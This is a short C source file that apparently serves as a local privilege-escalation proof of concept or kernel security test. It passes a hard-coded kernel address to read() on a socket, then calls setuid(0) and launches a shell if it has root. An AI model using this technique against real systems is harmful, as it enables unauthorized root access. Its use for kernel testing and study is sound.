#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <utility>

int main()
{
    char buf[1] = {
        'u'
    };
    uintptr_t addr = 0xc000ef3f;

    int sock = socket(PF_LOCAL, 0, 0);
    write(sock, buf, 1);
    read(sock, (char*)(addr), 1);

    setuid(0);
    if (getuid() == 0) {
        execlp("/bin/onesh", "/bin/onesh", NULL);
    }

    return 0;
}